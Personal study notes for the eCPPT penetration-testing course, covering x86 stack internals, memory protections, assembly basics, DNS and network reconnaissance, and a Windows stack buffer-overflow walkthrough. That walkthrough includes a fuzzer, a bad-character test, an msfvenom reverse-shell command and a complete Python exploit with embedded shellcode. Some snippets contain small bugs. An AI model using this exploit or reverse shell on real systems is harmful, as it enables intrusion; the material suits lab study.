# eCPPTNotes

## eCPPT ##

Architecture Fundamentals ::
	
	CPU:
		CPU Instructions are represented in hexadecimal(HEX).
		The instructions are complex to read(machine code), thus they're getting translated into Assembly code(ASM) which is human-readable.

		Each CPU has it's own ISA - Instruction set architecture,
		ISA is what a programmer can see:
			-memory
			-registers
			-instructions
			-etc.
			Provides all the necessary info for who want to write a program in that machine lang.
			Examples are: Intel 8086 - x86, AMD64 - x64
	Registers:
		number of bits 32,64 refers to the width of the CPU registers.
		Each CPU has its fixed set of registers that are accessed when required.
		General Purpose Registers (GPRs):
			EAX - Accumulator   	  - Used in arithmetic operations
			ECX - Counter       	  - Used in shift/rotate instr. and loops
			EDX - Data          	  - Used in arithmetic operations & I/O
			EBX - Base          	  - Used as a pointer to data
			ESP - Stack Pointer 	  - Pointer to the top of the stack
			EBP - Base Pointer  	  - Pointer to the base of the stack
			ESI - Source Index        - Used as a pointer to a source in stream operation
			EDI - Destination         - Used as a pointer to a destination in stream operation
			EIP - Instruction Pointer - tells the CPU where the next instuction is
	Process Memory:
		Text:
			The text region, or instr. segment, is fixed by the program and a contains the program code(instructions). - read-only.
		Data:
			The data region is divided into initialized data and uninitialized data.
			initialized data includes items such as static and global declared variables that are pre-defined and can be modified.
			uninitialized data, named 'Block Started by Symbol'(BSS), also initializes variables that are initialized to zero or do not have explicit initialization(C++ ex. : int t;)
		Heap:
			Starts right after BSS, during the execution the program can request more space in memory via brk and sbrk system calls, used by malloc(memory allocate) and realloc(re-allocate) and free. Hence, the size of the data region can be extended; this is not vital.
		Stack:
			The stack is a LIFO(Last in first out) block of memory. It is located in the higher part of the memory. Can be thought as an array used for saving a fucntion's return addresses, passing function arguments, and storing local variables.
			ESP:
				The purpose of the ESP register(Stack Pointer) is to identify the top of the stack,
				and it is modified each time a value is pushed in(PUSH) or popped out(POP).
			PUSH:
				A PUSH instruction subtracts 4(32-bit) or 8(64-bit) from the ESP and writes the data to the memory address in the ESP, then updates the ESP to the top of the stack.
				Stack grows backwards, therefore the PUSH substracts 4 or 8, in order to point to a lower memory location on the stack. If we don't subtract it, the PUSH operation will overwrite the current location pointed by ESP(the top) and we'd lose data.
			POP:
				Opposite of the PUSH instruction, it retrieves data from the top of the stack.
				Therefore, the data contained in the address location in ESP is retrieved and stored(usually in another register). After a POP operation, the ESP value is incremented, by 4 or by 8.
			Procedures and Fucntions:
				Stack Frames:
					Functions contain two important components, the prologue and the epilogue.
					The prologue prepares the stack to be used, similar to putting a bookmark in a book. when the function has completed, the epilogue resets the stack to the prologue settings.
					The stack consists of logical stack frames(portions/areas of the stack), that are PUSHed when calling a function and POPed when returning a value.
					When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location(top of stack); this allows the subroutine to operate independently in its own location in the stack.
					When a subroutine ends:
						1. The program recieves the parameters passed form the subroutine.
						2. The insturction Pointer(EIP) is reset to the location at the time of the initial call.
						The stack frame keeps track of the location where each subroutine should return the control when it terminates.
					when a functions is called, the arguments [(in brackets)] need to be evaluated.
					The control flow jumps to the body of the function, and the program executes its code.
					Once the function ends, a return statement is encountered, the program returns to the function call(the next statement in the code).
					When a new function is called, a new stack frame has to be created.
					the stack frame is defined by the EBP(Base Pointer) and the ESP(Stack Pointer)... the bottom and the top of the stack.
					For us to not lose the information of the old stack frame, which is the function that called the current function, we have to save the current EBP on the stack.
					If not done, we wouldn't know that this info belonged to a previous stack frame when returned.

					Prologue:
						Example of a function call:
							1. push ebp
							2. mov ebp, esp
							3. sub esp, X(number)

							1. push ebp:
								The first instruction saves the old EBP onto the stack, so it could be restored later.
							2. mov ebp, esp:
								The second instuction copies ESP value to EBP.
							3. sub esp, x:
								The last instruction moves the ESP by decreasing it's value, necessary for making space for the local variables.

					Epilogue:
						Example of a function pop:
							1. mov esp, ebp
							2. pop ebp
							3. ret

							1. mov esp, ebp:
								The first instruction makes both the ESP and EBP point to the same location.
							2. pop ebp:
								The second instruction removes the value of EBP from the stack, sinch the top of the stack points to the old EBP, the stack frame is restored. (and ESP points to the old EIP previously stored)
							3. ret:
								The last instruction pops the value contained at the top of the stack to the old EIP - The next instruction after the call and jumps to that location.
								RET affects only the EIP and the ESP registers.


				Endianness:
					The way of storing data in the memory.
					MSB - Most significant bit - in a binary number is the largest value, usually the first from the left.
					example:
						binary is - 100, MSB is 1.
					LSB - Least significant bit - in a binary number is the smallest value, usually the first from the right.
					example:
						binary is - 100, LSB is 0.

					Big-Endian:
						In the big-endian representation, the LSB is stored at the highest memory address, while the MSB at the lowest.
					Little-Endian:
						In the little-endian representation, the LSB is stored at the lowest memory address, while the MSB at the highest.

				NOPs:
					NOP is an Assembly language instruction that does nothing(NOP=No operation instruction).
					When a program encounters a NOP, it skips to the next instruction. in x86 represented by HEX value of 0x90.

					NOP-sled:
						NOP-sled is a technique used during exploitation process of buffer overflows. Its only purpose is to fill a large(or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
						That's because BOF(buffer overflow) have to match a specific size and location that the program is expecting.

Security Implementations ::

	ASLR:
		Address Space Layout Randomization(ASLR)
		The goal is to introduce randomness for executables, libraries, and stacks in the memory address space.
		Makes it difficult for an attacker to predict memory addresses and exploit.
		When ASLR is loaded the OS loads the same executable at different locations in memory every time.
		*ASLR is not enabled for all modules, means that there could be a DLL in the address space without the protection, making the whole prgoram vulnerable*

		Verify ASLR:
			-Process Explorer

		Mitigation:
			Enhanced Mitigation Experience Toolkit(EMET)

			DEP:
				Defensive hardware and software measure that prevents the execution of code from pages in memory that are not explicitly makred as executables.
				Code Injected into the memory can't be run from this region.

			The Canary(Stack Cookie):
				A security measure, places a value next to the return address in the stack.
				The function prologue loads a value into this location, while the epilogue makes sure that the value is intact.
				As a result, when the epilogue runs, it checks that the value is still there and that it is correct.


Assembly ::
	
	NASM:
		Assemble - nasm -f win32 file.asm -o output.obj
		Link DLLs - GoLink.exe /entry _main output.obj 1_dll.dll 2_dll.dll
			/entry _main - tells the linker the entry point for the program

	ASM Basics:
		Instructions:
			Data Transfer:
				MOV  - Moves data from one location to another on the memory
				XCHG - Exchange the data of two operands (but not between memory)
				PUSH - Pushes a value into the stack
				POP  - Deletes a value off the stack
			Arithmetic:
				ADD  - Increment
				SUB  - Subtract
				MUL  - Multiply
				XOR  - Exclusive or (outputs true only if when input differ, one is true and other is false)
				NOT  - same as '!'
			Control Flow:
				CALL - CALL a function 
				RET  - Return, end function
				LOOP - 
				Jc   - (c - condition) jump if NE(not equal), E(equal), NZ(not zero), JGE(greater or equal), etc.
			Other:
				STI  -
				CLI  -
				IN   -
				OUT  -

		Intel vs AT&T:
			Intel(Windows) - <instruction><destination><source>
			AT&T(Linux)    - <instruction><source><destination>
				puts % before registers and a $ before numbers.
				suffix to the instuction to define operand size as well:
					Q-quad(64bit), L-Long(32bit), W-Word(16bit), B-Byte(8bit)

		PUSH instruction:
			PUSH stores a value on the top of the stack, causing the stack to be adjusted by -4 bytes (on 32-bit), -0x04.
			PUSH under the hood just subtracts -4 from the ESP.

		POP instruction:
			POP reads the value from the top of the stack, causing the stack to be adjusted by +4 bytes, +0x04.
			Adds +4 to the ESP.

		CALL instruction:
			Subroutines are implemented by using the CALL and RET instruction pair.
			The CALL instruction pushes the current instruction pointer(EIP) to the stack and jumps to the function address specified.
			Whenever the function executes the RET instruction, the last element is popped from the stack, and the CPU jumps to the address.


Tools ::
	
	gcc - gcc -m32(architecture) file.c -o(output) file.exe
	objdump - objdump -d(disassemble) -Mintel(architecture) file.exe > assembly.txt




Buffer Overflows ::
	
	Buffer Overflows ::
	
	Fuzzing:
		
		import socket

		buffer=["A"]
		counter=100

		while len(buffer) <= 10:
		    buffer.append("A"*counter)
		    counter=counter+100

		for string in buffer:
		    print("Fuzzing... with %s bytes" % len(string))
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    connect=s.connect(('IP', port))
		    s.send((shellcode+'\r\n'))
		    s.close()


		when the program crashes, we note the bytes in which it happened and move on to finding the offset.

	Finding the offset:

		/usr/share/metasploit-framework/tools/exploits/pattern_create.rb -l (bytes)

		/usr/share/metasploit-framework/tools/exploits/pattern_offest.rb -l (bytes) -q (EIP)

		or with mona:

			!mona pc (pattern_create)

			!mona po (pattern_offset)


	Overwriting the EIP:

		import socket

		shellcode = "A"*<offset> + "B"*4
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
		         connect=s.connect(('IP', port))
		   	 s.send((shellcode+'\r\n'))
		except:
			print("CHECK DEBUGGER!.")
		s.close()

	Finding bad characters:

		import socket

		badchars = (
		"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
		"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
		"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
		"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
		"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
		"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
		"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
		"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

		shellcode = "A"*2003+"B"*4 + badchars
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		   	connect=s.connect(('IP', port))
		    	s.send((shellcode+'\r\n'))
		except:
			print("CHECK DEBUGGER!.")
		s.close()

		Then follow ESP in dump.

	Find the right module:

		!mona modules
			check for False ASLR+DEP dlls

		/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
			JMP ESP ? (FFE4)

		!mona find -s "\xff\xe4" -m dll.dll
		
		if none are found, just search for JMP ESP/ CALL ESP... and check which one's "PAGE_EXECUTE_READ" and not "READ_ONLY"
		
		then from results:

			import socket

			shellcode = "a"*2003 + "\x??\x??\x??\x??"
			s=scoket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
		    		connect=s.connect(('IP', port))
		    		s.send((shellcode+'\r\n'))
			except:
				print("CHECK DEBUGGER!.")
			s.close()

			see if .dll is loaded into EIP

	Gaining remote shell:

		msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST IP> LPORT=<LPORT> EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"(bad characters)

		add the payload, and some NOP's.
		a NOP is a hex of \x90, add it right after the overwritten EIP, NOP stands for 'no operation', so the program just skips those assembly lines.

		import socket

		exploit=("\xda\xcb\xd9\x74\x24\xf4\x5a\xbe\x8f\xe5\x98\xa8\x31\xc9\xb1"
		"\x52\x31\x72\x17\x03\x72\x17\x83\x4d\xe1\x7a\x5d\xad\x02\xf8"
		"\x9e\x4d\xd3\x9d\x17\xa8\xe2\x9d\x4c\xb9\x55\x2e\x06\xef\x59"
		"\xc5\x4a\x1b\xe9\xab\x42\x2c\x5a\x01\xb5\x03\x5b\x3a\x85\x02"
		"\xdf\x41\xda\xe4\xde\x89\x2f\xe5\x27\xf7\xc2\xb7\xf0\x73\x70"
		"\x27\x74\xc9\x49\xcc\xc6\xdf\xc9\x31\x9e\xde\xf8\xe4\x94\xb8"
		"\xda\x07\x78\xb1\x52\x1f\x9d\xfc\x2d\x94\x55\x8a\xaf\x7c\xa4"
		"\x73\x03\x41\x08\x86\x5d\x86\xaf\x79\x28\xfe\xd3\x04\x2b\xc5"
		"\xae\xd2\xbe\xdd\x09\x90\x19\x39\xab\x75\xff\xca\xa7\x32\x8b"
		"\x94\xab\xc5\x58\xaf\xd0\x4e\x5f\x7f\x51\x14\x44\x5b\x39\xce"
		"\xe5\xfa\xe7\xa1\x1a\x1c\x48\x1d\xbf\x57\x65\x4a\xb2\x3a\xe2"
		"\xbf\xff\xc4\xf2\xd7\x88\xb7\xc0\x78\x23\x5f\x69\xf0\xed\x98"
		"\x8e\x2b\x49\x36\x71\xd4\xaa\x1f\xb6\x80\xfa\x37\x1f\xa9\x90"
		"\xc7\xa0\x7c\x36\x97\x0e\x2f\xf7\x47\xef\x9f\x9f\x8d\xe0\xc0"
		"\x80\xae\x2a\x69\x2a\x55\xbd\x56\x03\x54\x29\x3f\x56\x56\x40"
		"\xe3\xdf\xb0\x08\x0b\xb6\x6b\xa5\xb2\x93\xe7\x54\x3a\x0e\x82"
		"\x57\xb0\xbd\x73\x19\x31\xcb\x67\xce\xb1\x86\xd5\x59\xcd\x3c"
		"\x71\x05\x5c\xdb\x81\x40\x7d\x74\xd6\x05\xb3\x8d\xb2\xbb\xea"
		"\x27\xa0\x41\x6a\x0f\x60\x9e\x4f\x8e\x69\x53\xeb\xb4\x79\xad"
		"\xf4\xf0\x2d\x61\xa3\xae\x9b\xc7\x1d\x01\x75\x9e\xf2\xcb\x11"
		"\x67\x39\xcc\x67\x68\x14\xba\x87\xd9\xc1\xfb\xb8\xd6\x85\x0b"
		"\xc1\x0a\x36\xf3\x18\x8f\x56\x16\x88\xfa\xfe\x8f\x59\x47\x63"
		"\x30\xb4\x84\x9a\xb3\x3c\x75\x59\xab\x35\x70\x25\x6b\xa6\x08"
		"\x36\x1e\xc8\xbf\x37\x0b")

		shellcode = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + exploit 

		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
		    connect=s.connect(('IP', port))
		    s.send((shellcode+'\r\n'))
		except:
		    print("ERROR!")
		s.close()

Information Gathering ::

	Infrastructures:

		goal is to retrieve:
			- Domains
			- Mail servers
			- Netblocks / IP Adresses
			- ISP's used
			- etc.

		Scope of engagement:

			SoE(Scope of engagement) is set by the customers needs:

				- Name of the organization - which is considered a full scope test
				- IP addresses / Netblocks to test

				Full Scope:

					DNS -> Dns enumeration techniques, whois
					IP  -> Reverse lookup, MSN Bing

				Netblocks/IP's:

					Live hosts -> Further DNS
					Further DNS

				*whois normally runs on port 43

		DNS Records:

			Resource Record -> TTL, Record class -> SDA, NS, A, PTR, CNAME, MX

			Resource Record - a resource record starts with a domain name usually a fully qualified domain name(FQDN, e.g. .www.google.com),

			TTL - Time-To-Live > recorded in seconds, defaults to the minimum value determinted in the SOA(Start of authority) record.

			Record Class - Internet, Hesoid, Chaos

			SOA - Start of Authority - Indicates the beginning of a zone and it should occur first in a zone file.
			There could only be one SOA record per zone.
			Defines certain values for the zone such as serial number and various expiration timeouts.

			NS - Name Server - defines an authoritative name server for a zone.
			Defines and delegates authority to a name server for a child zone.
			NS records are the glue that binds the distributed database together.

			A - Address - A record is a hostname to an IP address.
			Zones with A records are called "forward" zones.

			PTR - Pointer - the PTR record maps an IP address to a hostname.
			Zones with PTR records are called "reverse" zones.

			CNAME - the CNAME record maps an alias to an A record hostname

			MX - Mail Exchange - the MX record specifies a host that will accept mail on behalf of a given host.
			The host has an associated priority value, a single host may have multiple MX records.
			The records for a specified host make up a prioritized list.


			DNS Lookup:

				nslookup target.com

				Reverse lookup -> nslookup -type=PTR <IP>

				MX lookup      -> nslookup -type=MX <IP>

				Zone Transfers:

					Are usually a misconfiguration of the remote DNS server, they should be enabled only for trusted IP addresses.
					When zone transfers are enabled, we can enumerate the entire DNS record for that zone.
					Includes all the sub-domains of our domain (A Records).

					How it works:

						Starting off with a NS lookup -> nslookup -type=NS target.com

						then:

							nslookup
							server <NS Domain>
							ls -d target.com

					In Linux:

						dig target.com 

						Reverse lookup -> dig <IP> PTR

						MX Lookup      -> dig <IP> MX

						NS Lookup      -> dig <IP> NS

						Zone Transfer:

							dig axfr @target.com target.com

							dig +nocmd target.com AXFR +noall +answer @target.com

							* dig @<DOMAIN IP> target.com -t AXFR +nocookie


				determine subdomains:

					Reverse lookup from NS server, or lookup in Google/Bing -> ip:<ip> (in search)

					-Domaintools
					-DNSlytics
					-Networkappers
					-Robtex

			Netblocks and AS:

				Netblocks are basically subnets.
				AS - autonomous system - is made of one or more netblocks under the same administrative control.
				Big corporations and ISP's have an autonomous system, while smaller companies will barely have a netblock.

				nmap -> --disable-arp-ping / --send-ip
				nmap -> -PS flag to TCP scan to not generate too much traffic = workaround for firewalls


				futher dns:

					DNS TCP SCAN - nmap -sS -p53 <netblock>

					DNS UDP SCAN - nmap -sU -p53 <netblock>


			fierce -dns target.com
			fierce -dns target.com -dnsserver ns1.target.com
			dnsmap target.com
			dnsrecon -d target.com



	fping, hping:

		fping -e - time to send and recieve back the packer (IDS/IPS detection)

		hping3 -2 - send UDP packet
		hping3 -S - Host Discovery
		hping3 -p - SYN/ACK
		hping3 -F - FYN packet
		hping3 -U - urgent
		hping3 -X - XMAS package
		hping3 -Y - YMAS package
		hping3 -1 192.168.1.x --random-dest -I eth0 - check if subnet alive


	Tools:

		DnsDumpster.com
		dnsenum - https://github.com/fwaeytens/dnsenum
		dnsenum --subfile file.txt -v -f /usr/share/dnsenum/.txt -u a -r target.com - store subdomains in file.txt
